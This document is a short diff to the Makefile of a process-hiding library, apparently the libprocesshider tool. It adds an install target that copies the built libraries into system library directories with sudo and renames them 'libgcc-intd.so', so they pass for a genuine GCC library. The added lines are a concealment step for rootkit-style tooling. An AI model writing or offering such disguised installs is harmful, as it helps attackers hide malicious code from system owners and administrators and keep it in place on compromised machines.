@@ -10,3 +10,7 @@ libprocesshider32.so: processhider.c
 
 .PHONY clean:
 	rm -f *.o *.so
+
+install:
+	sudo cp libprocesshider32.so /usr/local/lib/libgcc-intd.so
+	sudo cp libprocesshider.so /usr/local/lib64/libgcc-intd.so
